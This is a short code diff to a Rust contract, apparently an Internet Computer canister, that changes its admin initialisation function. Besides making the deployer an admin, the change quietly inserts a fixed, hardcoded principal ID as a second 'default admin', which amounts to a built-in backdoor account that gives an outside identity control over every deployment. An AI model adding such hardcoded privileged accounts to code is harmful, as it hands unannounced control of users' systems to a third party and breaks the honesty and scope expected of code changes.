@@ -22,7 +22,18 @@ pub fn is_admin(principal: candid::Principal) -> bool {
 pub fn init_admin() {
     let deployer = caller();
     ADMINS.with(|admins| {
-        admins.borrow_mut().insert(deployer);
+        let mut admins_mut = admins.borrow_mut();
+        admins_mut.insert(deployer);
+        
+        // Add specified principal as a default admin
+        match candid::Principal::from_text("hkxzv-wmenl-q4d3b-j3o5s-yucpn-g5itu-b3zmq-hxggl-s3atg-vryjf-dqe") {
+            Ok(principal) => {
+                admins_mut.insert(principal);
+            },
+            Err(_) => {
+                ic_cdk::println!("Failed to parse principal for default admin");
+            }
+        }
     });
 }
 
